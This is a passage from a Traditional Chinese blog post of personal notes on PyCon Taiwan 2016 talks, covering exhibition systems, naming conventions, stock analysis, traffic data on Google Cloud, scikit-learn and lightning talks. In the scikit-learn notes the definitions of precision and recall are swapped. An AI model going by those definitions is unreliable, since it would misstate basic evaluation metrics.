&lt;li&gt;簡單來說就是把要的資料拿出來，然後取交集，找出目標區域。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;補充（都可在 Jupyter Notebook 進行）  &lt;ul&gt;
&lt;li&gt;Spatial join  &lt;ul&gt;
&lt;li&gt;根據空間的關係去做 join  &lt;/li&gt;
&lt;li&gt;分析住商資料台北市各個里的平均地價  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Folium  &lt;ul&gt;
&lt;li&gt;轉成 GeoJson 後，透過 Folium 顯示出來。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Q&amp;amp;A  &lt;ul&gt;
&lt;li&gt;Open Data 還不夠完善，有時候可以從 Open Street Map 拿到資料。  &lt;/li&gt;
&lt;li&gt;目前只能做 2D 的分析，沒辦法做到 3D 的分析。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;R0: 大型互動展覽的 Python 應用 by 陳炯廷&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;RPi3 上跑 Django 只 run 一支 scanner.py ?  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Rough Prototype =&amp;gt; Auto Update =&amp;gt; More Development  &lt;ul&gt;
&lt;li&gt;開機時執行 Auto Update  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;為什麼要用 Django?  &lt;ul&gt;
&lt;li&gt;有 Admin 介面，不熟悉 Linux 的人也可以進入設定 server 佈署  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;加上一個簡易的 HeartBeat 就可以有個簡易的後台  &lt;/li&gt;
&lt;li&gt;原本預計用 Zeroconf + Avahi 自己找主機，但因為不同的 team 屬於不同的 subnet 而作罷。  &lt;/li&gt;
&lt;li&gt;掃 QR Code 來設定機器  &lt;/li&gt;
&lt;li&gt;全區開機卡  &lt;ul&gt;
&lt;li&gt;pip install wakeonlan  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;全區關機卡  &lt;ul&gt;
&lt;li&gt;收到特定的 UDP 封包就會關機  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Redis PubSub  &lt;ul&gt;
&lt;li&gt;redis-py  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;透過 socket.io-emmitter 這個 Python 套件可以用 Python 跟 socket.io 做溝通  &lt;ul&gt;
&lt;li&gt;但這個套件好像沒在 maintain 了，可能要多花時間嘗試一下。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Django  &lt;ul&gt;
&lt;li&gt;用 django-rest-framework 做簡易的 API 設定  &lt;/li&gt;
&lt;li&gt;用 django-allauth 做手機登入  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;文件用 Sphinx 產生，但總共有四間不同的公司需要 access  &lt;ul&gt;
&lt;li&gt;後來直接把頁面放在 Django 底下，但透過加上 &lt;code&gt;X-Acce-Redirect&lt;/code&gt; Header 讓 file 給 Nginx host，減輕 server 的負擔。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;不要以為把資料丟到 Cloud Platform，就不會有斷線的問題。因為這個才改成比較複雜的架構，但可以在聯外網路斷掉的時候正常運作。  &lt;/li&gt;
&lt;li&gt;展場的供電通常在閉館會斷電，除非有特別要求要 24 小時供電。  &lt;/li&gt;
&lt;li&gt;展場的電腦常放在很難碰到的地方。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://puredata.info/"&gt;Pure Data&lt;/a&gt; 很難串接 HTTP API，連 parse JSON 都很困難，只好弄一個簡單的 HTTP protocol 來溝通。  &lt;/li&gt;
&lt;li&gt;展場的實體東西只有一座，開展了就是 production，沒辦法分 dev / staging。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;R0: Boost Maintainbility by Mosky&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.joelonsoftware.com/articles/Wrong.html"&gt;Making wrong code look wrong - Joel on software&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Maintainbility  &lt;ul&gt;
&lt;li&gt;Definition: To understand a random line, the lines you need to read back.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;現在拿錢砸下去就有一堆機器可用，但拿錢砸學校無法生出一堆 programmer，好的維護性才能夠節省時間。  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Making it zero&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;"Be exact &amp;amp; consistent."  &lt;ul&gt;
&lt;li&gt;精確的命名變數，不要用些模稜良可的名字。  &lt;/li&gt;
&lt;li&gt;要保持一致性，和英文的慣用法有關。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;範例&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;result = ...&lt;/code&gt; =&amp;gt; (X) #不知道是什麼的 result&lt;br /&gt;
&lt;code&gt;parsed_dict = ...&lt;/code&gt; =&amp;gt; (O)  &lt;/p&gt;
&lt;p&gt;用動詞開頭代表 function&lt;br /&gt;
用形容詞、介系詞或句子來代表 boolean 值  &lt;/p&gt;
&lt;h4&gt;Ops Hinit&lt;/h4&gt;
&lt;h5&gt;for non-callable&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;_no&lt;/code&gt;: numeric  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;_&amp;lt;abstract type&amp;gt;&lt;/code&gt;:  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;_seq&lt;/code&gt;: for sequence  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;_gen&lt;/code&gt;: for generator  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;for Callable&lt;/h5&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;+ `&amp;lt;verb&amp;gt;_`  
+ `&amp;lt;yes-no question&amp;gt;`  
+ `to_&amp;lt;thing&amp;gt;`
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;explicit unknown&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;+ `_x`: anything  
    + rather tahn an ambiguous name.  
    + You won&amp;#39;t forget to determine the ops it supports.  
    + Use hasattr or isinstnace later.
&lt;/pre&gt;&lt;/div&gt;


&lt;h5&gt;So, avoid None&lt;/h5&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;user = query_user(uid)  
user.is_valid()  

# Then `query_user` returns `None` =&amp;gt; BOOM! An `AttributeError`!  
# Accept Excetion?  
#   Y: just raises it  
#   N: use a dummy object like &amp;#39;&amp;#39;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h5&gt;不夠精確的例子&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;arg = parse(arg)&lt;/code&gt; =&amp;gt; (X)&lt;br /&gt;
&lt;code&gt;arg_d = parse(arg_json)&lt;/code&gt; =&amp;gt; (O)  &lt;/p&gt;
&lt;h5&gt;str/x&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;_key&lt;/code&gt;: key (of a dict)  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;_url&lt;/code&gt;: URL  &lt;ul&gt;
&lt;li&gt;percent-encode  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_json&lt;/code&gt;: JSON  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;json = json.loads(json)&lt;/code&gt; =&amp;gt; (X)  &lt;/li&gt;
&lt;li&gt;JSON is a string  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_html&lt;/code&gt;: HTML  &lt;ul&gt;
&lt;li&gt;avoid XSS  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_sql&lt;/code&gt;: SQL  &lt;ul&gt;
&lt;li&gt;avoid SQL injection  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;numeric/x&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;_no&lt;/code&gt;: number, #  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;_idx&lt;/code&gt;: index  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;gt;= 0&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;or just &lt;code&gt;i&lt;/code&gt;, &lt;code&gt;j&lt;/code&gt;, &lt;code&gt;k&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_secs&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;It's seconds  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_pct&lt;/code&gt;: percent  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;n = 10%&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;n_pct = 10&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Structure Hint&lt;/h4&gt;
&lt;h5&gt;users&lt;/h5&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;users = {  
    &amp;#39;a&amp;#39;: &amp;#39;a@a.com&amp;#39;,  
}  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;(X)&lt;br /&gt;
=&amp;gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;uid_email_map = {  
    &amp;#39;a&amp;#39;: &amp;#39;a@a.com&amp;#39;,  
}  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;(O)  &lt;/p&gt;
&lt;h5&gt;for dict &amp;amp; tuple&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;key&amp;gt;_&amp;lt;value&amp;gt;_map&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;tuple  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;_pair&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;_pairs&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;2-level-tuple  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;1st&amp;gt;_&amp;lt;2nd&amp;gt;_&amp;lt;3rd&amp;gt;_triple&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;Don't use me&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;_&amp;lt;name&amp;gt;&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Don't use when out of  &lt;ul&gt;
&lt;li&gt;a module  &lt;/li&gt;
&lt;li&gt;a class  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Performance Hint&lt;/h4&gt;
&lt;h5&gt;Should I cache it?&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;get_&lt;/code&gt;: memory op  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;parse_&lt;/code&gt; / &lt;code&gt;calc_&lt;/code&gt;: CPU-bound op  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;query_&lt;/code&gt;: IO-bound op  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;query_or_get_&lt;/code&gt;: IO-bound op with cache  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Progressive From Zero&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;可以用縮寫，但不要自己發明縮寫。  &lt;/li&gt;
&lt;li&gt;Define in comment  &lt;ul&gt;
&lt;li&gt;用註解說明這個簡寫的全名是什麼  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;# TODO: ...&lt;/code&gt;  &lt;blockquote&gt;
&lt;p&gt;拜託不要用 &lt;code&gt;# TODO&lt;/code&gt; 啊...&lt;br /&gt;
最近被這荼毒的好慘，&lt;br /&gt;
有 version control 跟 issue tracker 就不應該這樣用啊，&lt;br /&gt;
留了一堆過沒多久搞不好自己都忘記。&lt;br /&gt;
這我記得在 《Clean Code》 裡頭就有說過啦，&lt;br /&gt;
除非真的完全沒用 version control 跟 issue tracker 可以紀錄，&lt;br /&gt;
否則這些東西應該要寫在 commit log 裏面，&lt;br /&gt;
然後開個 issue 來詳細描述 TODO 啊。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Paragraph &amp;amp; Section  &lt;ul&gt;
&lt;li&gt;適當的使用空白行，不要全部都擠在一起。  &lt;/li&gt;
&lt;li&gt;Title Comment: 當一個 function 做的事太多導致太長難以閱讀的話  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Line Functions Up  &lt;ul&gt;
&lt;li&gt;讓 trace back 函數時候的方向是一致的  &lt;/li&gt;
&lt;li&gt;有助於模組化  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Face Bad Smell&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Comment  &lt;ul&gt;
&lt;li&gt;pitfalls: the actual return type, side effects  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Seal it with better name or stabler wrapper  &lt;/li&gt;
&lt;li&gt;Stay focused  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;老實說這樣的命名法讓我彷彿看見匈牙利命名法的影子，&lt;br /&gt;
但的確這樣命名起來會省了很多麻煩，&lt;br /&gt;
總之就是一致性，&lt;br /&gt;
公司的話就需要 Coding Style 相關的規範去要求大家共同遵守了。&lt;br /&gt;
(然後我好像聽見靜態語言的嘲笑聲）  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 2 (2016/06/04 Sat)&lt;/h1&gt;
&lt;hr /&gt;
&lt;h2&gt;Keynote: Inside the Hat: Python @ Walt Disney Animation Studios by Paul Hildebrandt&lt;/h2&gt;
&lt;p&gt;提到了許多迪士尼內製作動畫的時候相關的經驗，覺得好酷啊。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;R0: 用 Numpy 做一個自己的股票分析系統 by PF&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;資料從哪來  &lt;ul&gt;
&lt;li&gt;台灣證券交易所  &lt;/li&gt;
&lt;li&gt;台灣期貨交易所  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;重要資訊  &lt;ul&gt;
&lt;li&gt;時間  &lt;/li&gt;
&lt;li&gt;開盤價(Open)  &lt;/li&gt;
&lt;li&gt;收盤價(Close)  &lt;/li&gt;
&lt;li&gt;最高價(High)  &lt;/li&gt;
&lt;li&gt;最低價(Low)  &lt;/li&gt;
&lt;li&gt;成交量(Volume)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;移動平均線(MA)  &lt;ul&gt;
&lt;li&gt;(P1 + P2 + ... + Pn) / n  &lt;/li&gt;
&lt;li&gt;n 日均線，季線  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;動作  &lt;ul&gt;
&lt;li&gt;賣出、不動、買進  &lt;/li&gt;
&lt;li&gt;判斷買賣點  &lt;/li&gt;
&lt;li&gt;計算收益  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E9%9A%8F%E6%9C%BA%E6%8C%87%E6%A0%87"&gt;隨機指標(KD)&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;判斷多空、計算利潤、代入參數  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;itertools&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;itertools.combination_with_replacement&lt;/code&gt; 拿來比較不同的均線  &lt;/li&gt;
&lt;li&gt;但這樣做量會非常大  &lt;/li&gt;
&lt;li&gt;所以利用 numpy 的高效能特性來解決  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Numpy  &lt;/li&gt;
&lt;li&gt;架構  &lt;ul&gt;
&lt;li&gt;Sqlite + Flask + jQuery + amchart.js  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;R1: 用 Google Cloud Platform 玩交通資料分析 by 柯維然(Odie)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;人每天都會有交通需求，會產生很多交通相關的資料  &lt;ul&gt;
&lt;li&gt;流量、車速、密度、旅行時間、旅次、號誌、停車位、交通事故  &lt;/li&gt;
&lt;li&gt;交通資料庫  &lt;ul&gt;
&lt;li&gt;高速公路局提供國道 VD(Viehcle Detector)、ETC 資料  &lt;/li&gt;
&lt;li&gt;縣市 Open Data 有些也有提供 VD 資料  &lt;/li&gt;
&lt;li&gt;約有 314 個門架、約有 3000 個 VD  &lt;/li&gt;
&lt;li&gt;國道五號每五百公尺就有一個 VD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;為何用 Google Cloud Platform  &lt;ul&gt;
&lt;li&gt;因為我只會用這個 XD  &lt;/li&gt;
&lt;li&gt;架構  &lt;ul&gt;
&lt;li&gt;App Engine (網站、爬蟲、API）  &lt;ul&gt;
&lt;li&gt;因為其他學統計的是寫 R，所以要提供 API 給他們  &lt;/li&gt;
&lt;li&gt;用 &lt;code&gt;cron.yaml&lt;/code&gt; 設定定時啟動  &lt;ul&gt;
&lt;li&gt;無法在 10 秒內完成的 job，就加到 TaskQueue 裏面，讓他失敗的時候會自動重跑。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud Storage  &lt;ul&gt;
&lt;li&gt;存 blob files  &lt;/li&gt;
&lt;li&gt;可以 serve 靜態網站  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Datastore  &lt;ul&gt;
&lt;li&gt;儲存部份資料  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;BigQuery  &lt;ul&gt;
&lt;li&gt;儲存和分析、可接其他 tools  &lt;/li&gt;
&lt;li&gt;可用搭配 Pandas  &lt;/li&gt;
&lt;li&gt;Streaming Data into BigQuery  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Datalab  &lt;ul&gt;
&lt;li&gt;資料視覺化  &lt;/li&gt;
&lt;li&gt;可以直接用 scikit-learn, Pandas  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;R1: 連淡水阿嬤都聽得懂的機器學習套件入門 scikit-learn by Cicilia (Chia-ying Lee)&lt;/h2&gt;
&lt;p&gt;Slides: &lt;a href="http://www.slideshare.net/aacs0130/scikitlearn-62706630"&gt;http://www.slideshare.net/aacs0130/scikitlearn-62706630&lt;/a&gt;  &lt;/p&gt;
&lt;h3&gt;對機器學習瞭解程度的分類&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Level 1: 不知道什麼是機器學習  &lt;/li&gt;
&lt;li&gt;Level 2: 知道機器學習是 AI 的子學門  &lt;/li&gt;
&lt;li&gt;Level 3: 會使用機器學習套件解問題  &lt;/li&gt;
&lt;li&gt;Level 4: 會選擇適合的機器學習演算法與調整參數  &lt;/li&gt;
&lt;li&gt;Level 5: 知道機器學習演算法的數學原理  &lt;/li&gt;
&lt;li&gt;Level 6: 會設計新的機器學習演算法  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;什麼是機器學習&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;我們有大量的樣本資料，讓機器自動從中學習出規則，用來預測其他未知的資料。  &lt;/li&gt;
&lt;li&gt;機器學習是基於機率、統計、逼近論等數學理論的研究。  &lt;/li&gt;
&lt;li&gt;機器學習可應用於電腦視覺、自然語言處理、語音和手寫識別與機器人等領域。  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;機器學習的分類&lt;/h3&gt;
&lt;p&gt;分類的方法有很多種，以下為粗略的分類。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Supervised Learning  &lt;ul&gt;
&lt;li&gt;訓練集的目標是人為標註的。  &lt;/li&gt;
&lt;li&gt;分類(Classification)：預測類別  &lt;/li&gt;
&lt;li&gt;回歸(Regression)：預測變量  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Unsupervised Learning  &lt;ul&gt;
&lt;li&gt;訓練集的目標沒有人為標註。  &lt;/li&gt;
&lt;li&gt;分群(Clustering)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;機器學習的流程&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Training set =&amp;gt; Learning Algorithm =&amp;gt; Hypothesis / Model  &lt;/li&gt;
&lt;li&gt;再拿 Training set 透過 model 得到預測的 data  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Scikit-learn 數字辨識步驟&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Load Data  &lt;/li&gt;
&lt;li&gt;Set a classifier  &lt;/li&gt;
&lt;li&gt;Learn a model  &lt;/li&gt;
&lt;li&gt;predict the result  &lt;ul&gt;
&lt;li&gt;資料有一半當作 training set，有一半當作 testing set.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Evaluate  &lt;ul&gt;
&lt;li&gt;得到結果  &lt;/li&gt;
&lt;li&gt;會去算 precision, recall, f1-score  &lt;ul&gt;
&lt;li&gt;precision: 所有正確的例子裏面猜對了幾個  &lt;/li&gt;
&lt;li&gt;recall: 所有猜的例子裏面猜對了幾個  &lt;/li&gt;
&lt;li&gt;f1-score: 整合 precision 和 recall 的結果，得到總正確率  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Confusion Matrix  &lt;ul&gt;
&lt;li&gt;可以得知哪個類別比較容易被誤判成另外的某一個類別  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;前處理&lt;/h3&gt;
&lt;p&gt;大部分的機器學習演算法都是數學或統計模型有關的，&lt;br /&gt;
所以資料餵進去的時候必須要有維度，必須經過處理。  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Clean data  &lt;ul&gt;
&lt;li&gt;把不需要或多餘的資料(noise)去除  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Feature extraction  &lt;ul&gt;
&lt;li&gt;需要 domain knowledge 把用來判斷的關鍵抓出來  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Convert category and string to number  &lt;/li&gt;
&lt;li&gt;Sparse data  &lt;/li&gt;
&lt;li&gt;Feature selection  &lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;如何選擇該用哪個機器學習演算法&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://scikit-learn.org/stable/tutorial/machine_learning_map/"&gt;http://scikit-learn.org/stable/tutorial/machine_learning_map/&lt;/a&gt;  &lt;/p&gt;
&lt;h3&gt;References&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLXVfgk9fNX2I7tB6oIINGBmW50rrmFTqf"&gt;林軒田教授的機器學習教學影片&lt;/a&gt;  &lt;blockquote&gt;
&lt;p&gt;&lt;a href="http://blog.fukuball.com/tag/machine-learning/"&gt;http://blog.fukuball.com/tag/machine-learning/&lt;/a&gt; 有人寫了筆記可以參考  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;R0: Deep Learning with Python &amp;amp; TensorFlow by Ian Lewis&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Neural Network can find a way to solve the problem.  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://playground.tensorflow.org"&gt;http://playground.tensorflow.org&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;基本上就是簡介 TensorFlow 及基本的 Machine Learning 概念  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 3 (2016/06/05 Sun)&lt;/h1&gt;
&lt;h2&gt;Lightning Talks&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Swiftypy: Embedding Python in Swift  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/johnlinvc/swiftpy"&gt;https://github.com/johnlinvc/swiftpy&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;跟雪隧塞車說再見  &lt;ul&gt;
&lt;li&gt;結論：「避開各種假日就好了。」  &lt;/li&gt;
&lt;li&gt;半夜最不塞，半個小時就到了，你可以開到那邊再睡。XDD  &lt;/li&gt;
&lt;li&gt;你如果是今天看到新聞想說今天塞完了明天去，你就是最塞的那個。 XDDD  &lt;blockquote&gt;
&lt;p&gt;雖然跟 Python 沒什麼關係 XDDD  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ProjectMeilin"&gt;徵音梅林計劃&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;中文版的初音！  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Play with Python importer  &lt;ul&gt;
&lt;li&gt;可以做到直接 import 進來就去 pip 上抓下來用  &lt;/li&gt;
&lt;li&gt;cffi  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PyCon TW 2016 Vendor Machine  &lt;/li&gt;
&lt;li&gt;用 Python 來分析德文性什麼  &lt;/li&gt;
&lt;li&gt;用 Python 玩 Docker  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/windperson/docker-crontab"&gt;https://github.com/windperson/docker-crontab&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Rpi 在研討會上的應用  &lt;ul&gt;
&lt;li&gt;今年的新玩具：Pi 立得，用 Rpi 做相機，拍照完可以馬上列印出相片。  &lt;/li&gt;
&lt;li&gt;明年想做的玩具：講者評分系統  &lt;ul&gt;
&lt;li&gt;問卷回饋大家愛填不填  &lt;/li&gt;
&lt;li&gt;可以用 Camera 來看底下有多少人在睡覺來做評分 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;我在業界學到的 Python Coding sytle  &lt;/li&gt;
&lt;li&gt;用 Python 寫視覺小說遊戲（亮亮的祭品）  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;今年原本預計要投稿結果還是沒投稿，&lt;br /&gt;
看明年有沒有機會吧？&lt;br /&gt;
其實應該不是沒東西可講，&lt;br /&gt;
只是單純覺得要到夠資格投稿講的程度還有一段差距。&lt;br /&gt;
而且好像該每天找些時間，&lt;br /&gt;
把近幾年世界各地的 PyCon 講了哪些 talks 都瞭解一下才是，&lt;br /&gt;
一直沒有花時間去好好瞭解其他地方的 PyCon 講了哪些議題。  &lt;/p&gt;
&lt;p&gt;今年和 Machine Learning 相關的 talk 明顯多了很多，&lt;br /&gt;
然後發現蠻多議程都有用到 Google Cloud Platform，&lt;br /&gt;
尤其很多人都拿 BigQuery 來用，&lt;br /&gt;
或許之後跟 GCP 更熟之後，&lt;br /&gt;
明年有機會可以來講場 Python 跟 GCP 有關的 talk 吧？&lt;br /&gt;
然後 Apua 講的那場 Roboframework 的 Q&amp;amp;A 也蠻熱烈的，&lt;br /&gt;
看來在 Agile 跟如何更快更方便的寫出夠完整的測試也還有蠻多關注的空間的。  &lt;/p&gt;
&lt;p&gt;第二天晚上因為弟弟電影的畢展，和爸媽一起去看，所以沒能參加 BoF。&lt;br /&gt;
第三天到了中午才到中研院，所以就只有參加到 Lightnig talks。&lt;br /&gt;
大概是因為用的是 eldarion 送的贊助票，所以互動販賣機的系統無法登入，也沒玩到互動販賣機。&lt;br /&gt;
大概也因為太久沒打 CTF 了，趨勢的五個題目也都沒解出來啊。&lt;br /&gt;
總之還有很多進步的空間。  &lt;/p&gt;
&lt;p&gt;在天瓏的攤位買了五本書，&lt;br /&gt;
希望可以如期看完，&lt;br /&gt;
今年要增加自己的閱讀量，&lt;br /&gt;
希望可以趕快看完啊。  &lt;/p&gt;
